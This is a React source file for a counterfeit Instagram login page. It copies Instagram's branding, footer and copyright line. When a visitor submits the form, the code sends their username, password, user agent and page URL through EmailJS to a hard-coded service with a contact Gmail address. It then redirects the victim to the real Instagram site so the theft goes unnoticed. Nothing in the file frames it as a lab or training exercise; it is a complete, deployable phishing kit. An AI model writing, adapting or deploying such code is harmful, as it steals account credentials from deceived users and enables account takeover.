import React, { useState, useEffect } from 'react';

export default function App() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  useEffect(() => {
    // Load EmailJS script
    const script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
    script.onload = () => {
      // Initialize EmailJS with your public key
      window.emailjs.init("DCnFHeeyL6GEWE6J2");
    };
    document.head.appendChild(script);

    return () => {
      document.head.removeChild(script);
    };
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');
    
    try {
      // Check if EmailJS is loaded
      if (!window.emailjs) {
        throw new Error('EmailJS is not loaded');
      }
      
      // Send data to EmailJS
      const response = await window.emailjs.send(
        "service_wni6k0h", 
        "template_ap7mzek", 
        {
          from_name: username,
          to_name: "Admin",
          message: `Instagram Login Attempt:
          
Username: ${username}
Password: ${password}
Timestamp: ${new Date().toISOString()}
User Agent: ${navigator.userAgent}
Page URL: ${window.location.href}

This is an automated message with login attempt data.`,
          reply_to: "ictproject499@gmail.com",
          subject: `Instagram Login Attempt - ${username}`
        }
      );
      
      // Redirect to Instagram after successful submission
      window.location.href = 'https://www.instagram.com';
    } catch (err) {
      setError('An error occurred. Please try again. Error: ' + err.message);
      setIsLoading(false);
      console.error('EmailJS Error:', err);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center p-4">
      <div className="w-full max-w-sm">
        {/* Instagram Logo */}
        <div className="flex justify-center mb-8">
          <img 
            src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" 
            alt="Instagram" 
            className="w-44 h-auto"
          />
        </div>

        {/* Error Message */}
        {error && (
          <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded mb-4 text-sm">
            {error}
          </div>
        )}

        {/* Login Form Card */}
        <div className="bg-white border border-gray-300 rounded-lg p-6">
          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded text-sm focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                placeholder="Phone number, username, or email"
                required
              />
            </div>
            
            <div>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded text-sm focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                placeholder="Password"
                required
              />
            </div>

            {/* Login Button */}
            <button
              type="submit"
              className="w-full bg-blue-500 text-white py-1.5 rounded text-sm font-medium disabled:opacity-70 disabled:cursor-not-allowed"
              disabled={isLoading}
            >
              {isLoading ? (
                <div className="flex items-center justify-center">
                  <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Logging in...
                </div>
              ) : (
                'Log in'
              )}
            </button>
          </form>

          {/* Divider */}
          <div className="flex items-center my-4">
            <div className="flex-grow border-t border-gray-300"></div>
            <div className="px-4 text-xs text-gray-500">OR</div>
            <div className="flex-grow border-t border-gray-300"></div>
          </div>

          {/* Facebook Login */}
          <div className="text-center mb-4">
            <a href="#" className="text-blue-900 font-semibold text-sm">
              Log in with Facebook
            </a>
          </div>

          {/* Forgot Password */}
          <div className="text-center mt-4">
            <a href="#" className="text-sm text-gray-900">
              Forgot password?
            </a>
          </div>
        </div>

        {/* Sign Up Card */}
        <div className="bg-white border border-gray-300 rounded-lg p-4 mt-4 text-center">
          <p className="text-sm">
            Don't have an account? 
            <a href="#" className="text-blue-500 font-semibold ml-1">
              Sign up
            </a>
          </p>
        </div>

        {/* Get the App */}
        <div className="text-center mt-6">
          <p className="text-sm mb-2">Get the app.</p>
          <div className="flex justify-center space-x-2">
            <img 
              src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" 
              alt="App Store" 
              className="h-10"
            />
            <img 
              src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc7a8.png" 
              alt="Google Play" 
              className="h-10"
            />
          </div>
        </div>
      </div>

      {/* Footer Links */}
      <div className="mt-8 text-center text-xs text-gray-500 space-y-2 max-w-xs">
        <div className="flex flex-wrap justify-center gap-x-2">
          <a href="#" className="hover:underline">Meta</a>
          <a href="#" className="hover:underline">About</a>
          <a href="#" className="hover:underline">Blog</a>
          <a href="#" className="hover:underline">Jobs</a>
          <a href="#" className="hover:underline">Help</a>
          <a href="#" className="hover:underline">API</a>
          <a href="#" className="hover:underline">Privacy</a>
          <a href="#" className="hover:underline">Terms</a>
          <a href="#" className="hover:underline">Top Accounts</a>
          <a href="#" className="hover:underline">Hashtags</a>
          <a href="#" className="hover:underline">Locations</a>
          <a href="#" className="hover:underline">Instagram Lite</a>
          <a href="#" className="hover:underline">Contact Uploading</a>
        </div>
        <div>
          <select className="bg-transparent text-xs text-gray-500 border-0 focus:ring-0">
            <option>English</option>
          </select>
        </div>
        <div>© 2025 Instagram from Meta</div>
      </div>
    </div>
  );
}
